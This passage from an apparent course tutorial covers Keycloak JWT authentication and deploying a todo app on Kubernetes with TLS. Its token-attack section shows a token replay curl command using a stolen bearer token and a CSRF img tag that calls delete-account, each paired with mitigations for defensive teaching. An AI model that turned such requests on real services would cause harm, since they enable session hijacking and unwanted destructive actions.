- Use Content Security Policy (CSP)
- Sanitize all user input
- Use frameworks that escape by default (React does this)

**2. Token Replay Attack**
```bash
# Attacker intercepts token and reuses it
curl -H "Authorization: Bearer stolen_token" https://api.example.com/admin
```

**Mitigation:**
- Short token lifetimes (5-15 minutes)
- Token binding (bind to TLS session)
- Audience validation (token only for specific API)

**3. CSRF with Tokens**
```html
<!-- Attacker's page -->
<img src="https://api.example.com/delete-account?token=..." />
```

**Mitigation:**
- Use Authorization header (not cookies or query params)
- Validate origin headers
- Use CSRF tokens for state-changing operations

### Debugging JWT Tokens

**Decode token without verification:**
```bash
# Header
echo "eyJhbGc..." | base64 -d | jq

# Payload
echo "eyJzdWI..." | base64 -d | jq
```

**Verify token signature:**
```python
import jwt
import requests

# Get Keycloak's public keys
keys_url = "https://keycloak.../realms/myapp/protocol/openid-connect/certs"
keys = requests.get(keys_url).json()

# Find key and verify
for key in keys['keys']:
    if key['kid'] == token_kid:
        public_key = jwt.algorithms.RSAAlgorithm.from_jwk(key)
        decoded = jwt.decode(token, public_key, algorithms=['RS256'])
```

**Useful tools:**
- **jwt.io** - Decode and verify tokens in browser
- **openssl** - Verify signatures manually
- **Keycloak Admin Console** - View/revoke tokens
- **Browser DevTools** - Inspect network requests

---

## Security Best Practices

### For Production

- [ ] Change all default passwords
- [ ] Use strong database passwords
- [ ] Use Let's Encrypt production certificates (`certIssuer: letsencrypt-prod`)
- [ ] Configure SMTP for password recovery emails
- [ ] Enable MFA for admin accounts
- [ ] Use HTTPS everywhere
- [ ] Set appropriate token lifetimes (access: 5min, refresh: 30 days)
- [ ] Enable event logging and auditing
- [ ] Backup database regularly
- [ ] Keep Keycloak updated

### Token Lifetimes

Example settings (adjust to your application):
- Access Token: 5 minutes (short-lived, frequently refreshed)
- SSO Session Idle: 30 minutes (logout if inactive)
- SSO Session Max: 10 hours (max session length)
- Normal refresh-token validity follows SSO/client session idle and maximum settings; offline tokens have separate settings. There is no independent 30-day normal refresh lifetime overriding those sessions.

---

## Exercise: Deploy Todo App on Kubernetes with Production TLS

This exercise challenges you to deploy the complete todo application on LTU Rancher with production Let's Encrypt certificates.

### Overview

Deploy a full-stack authenticated application:
- **Keycloak** - Already running (from earlier in this tutorial)
- **Flask Backend API** - Containerized and deployed on K8s
- **React Frontend** - Containerized and deployed on K8s with HTTPS

### Prerequisites

- Keycloak running on `https://keycloak.ltu-m7011e-yourname.se`
- Realm `myapp` created
- Understanding of Docker and Kubernetes from previous tutorials

### Step 1: Prepare the Backend

**1.1 Create Dockerfile for Flask API**

Create `example-part-3-todo-rbac/backend/Dockerfile`:
```dockerfile
FROM python:3.11-slim

WORKDIR /app

# Install dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY app.py .

# Run as non-root user
RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
USER appuser

EXPOSE 5001

CMD ["gunicorn", "--bind", "0.0.0.0:5001", "--workers", "1", "app:app"]
```

**1.2 Create requirements.txt**

Create `example-part-3-todo-rbac/backend/requirements.txt`:
```
Flask==3.0.0
flask-cors==4.0.0
PyJWT==2.8.0
cryptography==41.0.7
requests==2.31.0
gunicorn==23.0.0
```

**1.3 Update Configuration for Production**

The included backend already reads the environment variables below. With trusted TLS, set `INSECURE=false` and your public frontend origin in the Deployment (shown in Step 2). If adapting another backend, use:
```python
import os

# Keycloak configuration from environment
KEYCLOAK_URL = os.getenv('KEYCLOAK_URL', 'https://keycloak.ltu-m7011e-yourname.se')
REALM = os.getenv('KEYCLOAK_REALM', 'myapp')
CLIENT_ID = os.getenv('KEYCLOAK_CLIENT_ID', 'my-frontend-app')
API_AUDIENCE = os.getenv('KEYCLOAK_AUDIENCE', 'todo-api')
INSECURE = os.getenv('INSECURE', 'False').lower() == 'true'

# CORS - allow your frontend domain
FRONTEND_URL = os.getenv('FRONTEND_URL', 'https://todo.ltu-m7011e-yourname.se')
CORS(app, resources={
    r"/api/*": {
        "origins": [FRONTEND_URL],
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})
```

**1.4 Build and Push Docker Image**

```bash
# From 12-keycloak/
cd example-part-3-todo-rbac/backend

# Build image
docker build -t todo-backend:latest .

# Tag for your registry (if using private registry)
docker tag todo-backend:latest registry.example.com/todo-backend:latest

# Push to registry
docker push registry.example.com/todo-backend:latest
```

### Step 2: Deploy Backend on Kubernetes

**2.1 Create Backend Deployment**

Create `example-part-3-todo-rbac/k8s/backend-deployment.yaml`:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: todo-backend
  namespace: yournamespace
spec:
  replicas: 1  # In-memory todos are local to one process
  selector:
    matchLabels:
      app: todo-backend
  template:
    metadata:
      labels:
        app: todo-backend
    spec:
      containers:
      - name: todo-backend
        image: registry.example.com/todo-backend:latest
        ports:
        - containerPort: 5001
        env:
        - name: KEYCLOAK_URL
          value: "https://keycloak.ltu-m7011e-yourname.se"
        - name: KEYCLOAK_REALM
          value: "myapp"
        - name: KEYCLOAK_CLIENT_ID
          value: "my-frontend-app"
        - name: FRONTEND_URL
          value: "https://todo.ltu-m7011e-yourname.se"
        - name: INSECURE
          value: "false"  # Production TLS
        resources:
          requests:
            cpu: 100m
            memory: 128Mi
          limits:
            cpu: 500m
            memory: 512Mi
        livenessProbe:
          httpGet:
            path: /
            port: 5001
          initialDelaySeconds: 10
          periodSeconds: 30
        readinessProbe:
          httpGet:
            path: /
            port: 5001
          initialDelaySeconds: 5
          periodSeconds: 10
---
apiVersion: v1
kind: Service
metadata:
  name: todo-backend
  namespace: yournamespace
spec:
  selector:
    app: todo-backend
  ports:
  - protocol: TCP
    port: 5001
    targetPort: 5001
  type: ClusterIP
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: todo-backend
  namespace: yournamespace
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt-prod
spec:
  ingressClassName: traefik
  tls:
  - hosts:
    - todo-api.ltu-m7011e-yourname.se
    secretName: todo-backend-tls
  rules:
  - host: todo-api.ltu-m7011e-yourname.se
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: todo-backend
            port:
              number: 5001
```

**2.2 Deploy Backend**

Run the following commands from `12-keycloak/`. Create `example-part-3-todo-rbac/k8s/` and your chosen namespace first. Replace `yournamespace` consistently in both manifests.

```bash
kubectl apply -f example-part-3-todo-rbac/k8s/backend-deployment.yaml

# Verify deployment
kubectl get pods -n yournamespace -l app=todo-backend
kubectl get ingress -n yournamespace

# Test backend
curl https://todo-api.ltu-m7011e-yourname.se/
```

### Step 3: Prepare the Frontend

**3.1 Create Dockerfile for React App**

Create `example-part-3-todo-rbac/frontend/Dockerfile`:
```dockerfile
# Build stage
FROM node:22-alpine AS build

WORKDIR /app

# Install dependencies
COPY package*.json ./
RUN npm ci

# Copy source code
COPY . .

# Build production bundle
RUN npm run build

# Production stage
FROM nginx:alpine

# Copy built app to nginx
COPY --from=build /app/build /usr/share/nginx/html

# Copy nginx config
COPY nginx.conf /etc/nginx/conf.d/default.conf

EXPOSE 80

CMD ["nginx", "-g", "daemon off;"]
```

**3.2 Create nginx Configuration**

Create `example-part-3-todo-rbac/frontend/nginx.conf`:
```nginx
server {
    listen 80;
    server_name localhost;
    root /usr/share/nginx/html;
    index index.html;

    # Enable gzip compression
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    # SPA routing - all routes go to index.html
    location / {
        try_files $uri $uri/ /index.html;
    }

    # Cache static assets
    location /static/ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
}
```

**3.3 Update Frontend Configuration**

Edit `src/keycloak-config.js`:
```javascript
export const keycloakConfig = {
  url: 'https://keycloak.ltu-m7011e-yourname.se',
  realm: 'myapp',
  clientId: 'my-frontend-app'
};
```

Edit `src/api.js`:
```javascript
// Use production API URL
const API_BASE_URL = 'https://todo-api.ltu-m7011e-yourname.se/api';
```

**3.4 Build and Push Docker Image**

```bash
# From 12-keycloak/ in a new terminal
cd example-part-3-todo-rbac/frontend

# Build image
docker build -t todo-frontend:latest .

# Tag and push
docker tag todo-frontend:latest registry.example.com/todo-frontend:latest
docker push registry.example.com/todo-frontend:latest
```

### Step 4: Deploy Frontend on Kubernetes

**4.1 Create Frontend Deployment**

Create `example-part-3-todo-rbac/k8s/frontend-deployment.yaml`:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: todo-frontend
  namespace: yournamespace
spec:
  replicas: 2
  selector:
    matchLabels:
      app: todo-frontend
  template:
    metadata:
      labels:
        app: todo-frontend
    spec:
      containers:
      - name: todo-frontend
        image: registry.example.com/todo-frontend:latest
        ports:
        - containerPort: 80
        resources:
          requests:
            cpu: 50m
            memory: 64Mi
          limits:
            cpu: 200m
            memory: 256Mi
        livenessProbe:
          httpGet:
            path: /
            port: 80
          initialDelaySeconds: 10
          periodSeconds: 30
        readinessProbe:
          httpGet:
            path: /
            port: 80
          initialDelaySeconds: 5
          periodSeconds: 10
---
apiVersion: v1
kind: Service
metadata:
  name: todo-frontend
  namespace: yournamespace
spec:
  selector:
    app: todo-frontend
  ports:
  - protocol: TCP
    port: 80
    targetPort: 80
  type: ClusterIP
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: todo-frontend
  namespace: yournamespace
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt-prod
spec:
  ingressClassName: traefik
  tls:
  - hosts:
    - todo.ltu-m7011e-yourname.se
    secretName: todo-frontend-tls
  rules:
  - host: todo.ltu-m7011e-yourname.se
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: todo-frontend
            port:
              number: 80
```

**4.2 Deploy Frontend**

```bash
kubectl apply -f example-part-3-todo-rbac/k8s/frontend-deployment.yaml

# Verify deployment
kubectl get pods -n yournamespace -l app=todo-frontend
kubectl get ingress -n yournamespace

# Check TLS certificate
kubectl get certificate -n yournamespace
```

### Step 5: Update Keycloak Client

**5.1 Update Redirect URIs**

Update `create-client.py`:
```python
FRONTEND_URLS = [
    "https://todo.ltu-m7011e-yourname.se",
]
```

Run:
```bash
# Delete old client
python3 delete-client.py

# Create new client with production URL
python3 create-client.py
```

**5.2 Update CORS in Keycloak**

The client creation script automatically configures Web Origins, but verify in Keycloak Admin Console:
- Go to Clients → my-frontend-app
- Check "Web Origins" includes `https://todo.ltu-m7011e-yourname.se`

### Step 6: Test the Complete Application

**6.1 Access the Application**

Open browser: `https://todo.ltu-m7011e-yourname.se`

**6.2 Verify Functionality**

1. Click "Log In" button
2. You should be redirected to Keycloak login
3. Login with your test user
4. You should be redirected back to the todo app
5. Add a todo item
6. Verify it appears in the list
7. Toggle completion status
8. Delete a todo

**6.3 Verify Security**

Check browser developer tools:
- ✅ All requests use HTTPS
- ✅ Valid Let's Encrypt certificate
- ✅ Authorization header includes JWT token
- ✅ API calls to `https://todo-api.ltu-m7011e-yourname.se`

### Step 7: Bonus Challenges

1. **Add Horizontal Pod Autoscaling (HPA)** after replacing in-memory storage with a shared database
   ```yaml
   apiVersion: autoscaling/v2
   kind: HorizontalPodAutoscaler
   metadata:
     name: todo-backend-hpa
   spec:
     scaleTargetRef:
       apiVersion: apps/v1
       kind: Deployment
       name: todo-backend
     minReplicas: 2
     maxReplicas: 10
     metrics:
     - type: Resource
       resource:
         name: cpu
         target:
           type: Utilization
           averageUtilization: 70
   ```

2. **Add Persistent Storage for Todos**
   - Replace in-memory storage with PostgreSQL
   - Create PersistentVolumeClaim
   - Update Flask app to use SQLAlchemy

3. **Implement Health Checks**
   - Add `/health` endpoint to Flask app
   - Configure advanced liveness/readiness probes

4. **Add Monitoring**
   - Deploy Prometheus and Grafana
   - Export metrics from Flask app
   - Create dashboards for request rate, latency, errors

5. **Deploy with Argo CD**
   - Create Argo CD Application manifest
   - Set up GitOps workflow
   - Implement automated deployments

6. **Add NetworkPolicies**
   - Restrict traffic between pods
   - Allow ingress-controller → backend traffic; frontend JavaScript calls from the user's browser, not the frontend Pod
   - Allow DNS egress and backend → Keycloak key retrieval, plus browser access to Keycloak

### Deliverables

Submit:
- [ ] All Kubernetes YAML files
- [ ] Both Dockerfiles
- [ ] Screenshots of running application
- [ ] Screenshot of valid TLS certificate
- [ ] Output of `kubectl get all -n yournamespace`
- [ ] Brief report explaining your deployment choices

---

## Exercise: Secure Your Previous Projects

Now it's your turn! Add Keycloak authentication to one of your previous tutorial projects.

### Challenge Ideas

1. **Basics**: Add login/logout to your Tutorial 9 React app
2. **Intermediate**: Protect your Tutorial 1 Flask API with JWT validation
3. **Advanced**: Implement role-based access control in your project
4. **Expert**: Add social login and MFA

### Bonus Challenges

- Create custom login page theme
- Implement "Remember Me" functionality
- Add user self-registration with email verification
- Set up admin panel with user management

---

## Additional Resources

- [Keycloak Official Documentation](https://www.keycloak.org/documentation)
- [OAuth 2.0 Specification](https://oauth.net/2/)
- [OpenID Connect Specification](https://openid.net/connect/)
- [JWT.io Debugger](https://jwt.io/) - Decode and inspect JWTs
- [Keycloak Admin REST API](https://www.keycloak.org/docs-api/latest/rest-api/)

---

**Key Takeaway**: Keycloak provides enterprise-grade authentication with minimal code. Instead of building your own auth system (and making security mistakes), you get industry-standard protocols, best practices, and features out of the box.
